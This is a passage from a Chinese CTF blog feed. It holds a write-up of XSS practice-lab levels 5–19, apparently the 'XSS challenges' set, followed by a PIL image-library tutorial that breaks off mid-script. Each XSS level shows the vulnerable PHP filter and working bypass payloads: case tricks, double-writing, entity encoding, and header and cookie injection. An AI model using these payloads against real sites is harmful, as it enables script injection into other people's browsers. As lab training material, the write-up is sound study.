<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str3.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>on</code>，<code>&lt;script</code>中间插入了_。而且使用了<code>strtolower</code>这个函数导致大小写绕过行不通。但是没有过滤&lt;&gt;。</p>
<p><strong>payload:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;go&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="level6"><a href="#level6" class="headerlink" title="level6"></a><strong>level6</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>script</code>，<code>on</code>，<code>src</code>，<code>data</code>，<code>href</code>中间插入了_，但是并没有过滤大小写。</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;Script&gt;alert(/xss/)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">Src</span>=<span class="string">x</span> <span class="attr">OnError</span>=<span class="string">alert(/xss/)</span>&gt;</span></span></span><br><span class="line"><span class="xml">&quot; Onclick=&quot;alert(/xss/)</span></span><br></pre></td></tr></table></figure>

<h5 id="level7"><a href="#level7" class="headerlink" title="level7"></a><strong>level7</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str =strtolower( $_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,$str5);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到过滤了<code>script</code>，<code>on</code>，<code>src</code>，<code>data</code>，<code>href</code>替换为空，并且过滤了大小写，尝试双写绕过。</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;sscriptcript&gt;alert(/xss/)&lt;/sscriptcript&gt;</span></span><br><span class="line"><span class="string">&quot;</span> oonnmouseover=<span class="string">&quot;alert(/xss/)</span></span><br></pre></td></tr></table></figure>

<h5 id="level8"><a href="#level8" class="headerlink" title="level8"></a><strong>level8</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;</span>&gt;</span><br><span class="line"> echo <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.$str7.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>script</code>，<code>on</code>，<code>src</code>，<code>data</code>，<code>href</code>中间插入了_，并且过滤了大小写。在href中<code>&quot;</code>被转换为html实体，可以使用编码代替绕过。</p>
<p><strong>payload:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Javascrip&amp;#x74;:alert(/xss/)</span><br><span class="line">Javasc&amp;#114;ipt:alert(/xss/)</span><br><span class="line">Javasc&amp;#x0072;ipt:alert(/xss/)</span><br></pre></td></tr></table></figure>

<h5 id="level9"><a href="#level9" class="headerlink" title="level9"></a><strong>level9</strong></h5><p>源代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(false===strpos($str7,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.$str7.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>过滤的东西都和第八关一样，多了一个检测http://而已</p>
<p><strong>payload:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Javascrip&amp;#x74;:alert(/xss/) //http://</span><br><span class="line">Javascrip&amp;#x74;:%0ahttp://%0aalert(/xss/)</span><br><span class="line">Javascrip&amp;#x74;:%0dhttp://%0dalert(/xss/)</span><br></pre></td></tr></table></figure>

<h5 id="level10"><a href="#level10" class="headerlink" title="level10"></a><strong>level10</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到只有t_sort被赋值了。</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?t_sort=<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level11"><a href="#level11" class="headerlink" title="level11"></a><strong>level11</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现<code>keyword</code>和<code>t_sort</code>这两个参数都被<code>htmlspecialchars</code>。</p>
<p>而<code>t_ref</code>是refer头，过滤了尖括号。截包改refer头即可。</p>
<img src="http://img.kawhi.xyz/image-20200429203051769.png" alt="image-20200429203051769" style="high:80%;width:80%;" />

<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">referer:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level12"><a href="#level12" class="headerlink" title="level12"></a><strong>level12</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>和11关类似：</p>
<img src="http://img.kawhi.xyz/image-20200429203527694.png" alt="image-20200429203527694" style="high:80%;width:80%;" />

<p><strong>payload：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">User-Agent:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level13"><a href="#level13" class="headerlink" title="level13"></a><strong>level13</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>和前两关差不多，传cookie进user变量。</p>
<img src="http://img.kawhi.xyz/image-20200429204317830.png" alt="image-20200429204317830" style="high:80%;width:80%;" />

<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">user=<span class="string">&quot; onclick=alert(/xss/) type=&quot;</span>button<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="level16"><a href="#level16" class="headerlink" title="level16"></a><strong>level16</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str4);</span><br><span class="line">echo <span class="string">&quot;&lt;center&gt;&quot;</span>.$str5.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>空格被过滤了</p>
<p><strong>payload：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?keyword=<span class="xml"><span class="tag">&lt;<span class="name">img%0dsrc=1%0donerror=alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h5 id="level17"><a href="#level17" class="headerlink" title="level17"></a><strong>level17</strong></h5><p>源代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?arg01=a&amp;arg02= onclick=alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level19"><a href="#level19" class="headerlink" title="level19"></a><strong>level19</strong></h5><p>源代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这一关是flash xss。这种xss比较少见，具体详情：<a style="text-decoration:none;" class="foo" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html" target="_blank">传送门</a></p>
<p><strong>paylaod:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?arg01=version&amp;arg02=<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>= <span class="string">&quot;javascript:alert(document.domain)&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>如何用PIL库处理图片</title>
    <url>/2020/04/19/%E5%A6%82%E4%BD%95%E7%94%A8PIL%E5%BA%93%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>最近有几场CTF比赛，里面的题都不会做，没有思路，感觉自己现在的状态就是思而不学则殆，于是乎就在bugku里面刷杂项题。遇到一些图片的题目，除了使用kail的binwalk,foremost隐写图片和改高度宽度以及使用一些工具之外，还发现有好几题都要用到PIL库这个东西，就记录一下怎么用。</p>
<p>关于PIL库的更多用法可以参考：<a style="text-decoration:none;" class="foo" href="https://www.liaoxuefeng.com/wiki/897692888725344/966759628285152" target="_blank">传送门</a></p>
<h4 id="使用PIL库"><a href="#使用PIL库" class="headerlink" title="使用PIL库"></a><strong>使用PIL库</strong></h4><p><strong>安装库</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure>

<p><strong>加载图片，使用方法open</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>im是一个Image对象，属性有format，size，mode。format是格式，size 是一个元组，表示(宽，高)，mode则指的图片的模式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> im.format,im.size,im.mode</span><br></pre></td></tr></table></figure>

<p>console输出如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">JPEG (<span class="number">245</span>, <span class="number">280</span>) RGB</span><br></pre></td></tr></table></figure>

<p><strong>呈现图片，方法show方便用来调试和测试。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>

<p><strong>图片的读和写</strong></p>
<p>读文件用Image.open()，保存文件用Image.save()，也可以用save方法来进行图片的格式转换。使用os模块中的os.path.splitext()方法可以讲文件名和扩展名分离开来，下面的代码能够把jpg格式的图片转为png格式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">infile = <span class="string">&#x27;Mycat.jpg&#x27;</span></span><br><span class="line">f,e = os.path.splitext(infile)</span><br><span class="line">outfile = f + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"> Image.open(infile).save(outfile)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line"> <span class="keyword">print</span> <span class="string">&quot;cannot convert&quot;</span>,infile</span><br></pre></td></tr></table></figure>

<p><strong>图片的剪切，黏贴</strong></p>
<p><strong>(1)</strong> <strong>图片剪切</strong></p>
<p>从一张图片中剪切出一块区域，比如从图片提取矩形，使用crop()方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">region.show()</span><br></pre></td></tr></table></figure>

<p>关于这个box，这是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。 假设box是(x1,y1,x2,y2)，则所取区域是以各自坐标划线所围的区域。</p>
<img src="http://img.kawhi.xyz/image-20200419225057613.png" alt="image-20200419225057613" style="high:80%;width:80%;" />

<p><strong>（2）图片黏贴</strong></p>
<p>图片的黏贴就是将一张图覆盖到另一张图上面。黏贴的方法是paste()。格式为：paste(要贴的图片，要贴的图片的4元坐标组成的区域)。如下面，我们把Mycat.jpg这张图片，取区域(50,50,200,200)，将该区域旋转180度后贴到原来的位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">50</span>,<span class="number">50</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line"><span class="comment"># 将图片逆序旋转180后，黏贴到原来复制的位置 </span></span><br><span class="line">region = region.transpose(Image.ROTATE_180)</span><br><span class="line">im.paste(region,box)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>

<p><strong>图像序列</strong></p>
<p>当处理GIF这种包含多个帧的图片，称之为序列文件，PIL会自动打开序列文件的第一帧。而使用seek和tell方法可以在不同帧移动。tell是帧数，而seek是取当前帧数的图片。</p>
<p>使用while循环：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im &#x3D; Image.open(&quot;laopo.gif&quot;)</span><br><span class="line">im.seek(1)</span><br><span class="line">im.show()</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line"> while 1:</span><br><span class="line"> im.seek(im.tell()+1)</span><br><span class="line"> im.show()</span><br><span class="line">except EOFError:</span><br><span class="line"> pass</span><br></pre></td></tr></table></figure>

<p>如果要使用for循环，可以使用ImageSequence模块的Iterator方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageSequence</span><br><span class="line"> </span><br><span class="line">im = Image.open(<span class="string">&quot;laopo.gif&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> ImageSequence.Iterator(im):</span><br><span class="line">  frame.show()</span><br></pre></td></tr></table></figure>

<p><strong>读取像素和修改像素</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">    tmp = img.getpixel((i,j))</span><br><span class="line">    img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,tmp[<span class="number">2</span>]))</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<h4 id="CTF实例："><a href="#CTF实例：" class="headerlink" title="CTF实例："></a><strong>CTF实例：</strong></h4><h5 id="红绿灯"><a href="#红绿灯" class="headerlink" title="红绿灯"></a><strong>红绿灯</strong></h5><p>首先题目是一张gif，用2345看图王或者PS打开都可以，会发现有1168帧，然后保存所有帧。</p>
<img src="http://img.kawhi.xyz/image-20200419184820875.png" alt="image-20200419184820875" style="high:80%;width:80%;" />

<p>会发现多数是绿灯和红灯，偶尔有黄灯，可以推测红色和绿色对应二进制0和1，黄色作为分隔。</p>
<p>这样第一个黄灯之前数值为01100110或10011001，而01100110二进制转成ascii对应字符就是‘f’,依次可以验证前四个字符为flag。就可以确定绿灯对应0，红灯对应1。</p>
<p>这里如果手动算的话是可以一张一张这样算出flag的。也可以用python的PIL库。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\Traffic_Light_gif\\&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1168</span>):</span><br><span class="line">	image=Image.open(path+<span class="string">&#x27;Traffic_Light_&#x27;</span>+str(i)+<span class="string">&#x27;.JPG&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> image.getpixel((<span class="number">115</span>,<span class="number">55</span>))==(<span class="number">254</span>, <span class="number">0</span>, <span class="number">0</span>): <span class="comment">#如果上灯等于红</span></span><br><span class="line">		    flag+=str(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">elif</span> image.getpixel((<span class="number">115</span>,<span class="number">145</span>))==(<span class="number">8</span>, <span class="number">253</span>, <span class="number">8</span>): <span class="comment">#如果下灯等于绿</span></span><br><span class="line">		    flag+=str(<span class="number">0</span>)</span><br><span class="line">flag= hex(int(flag,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span 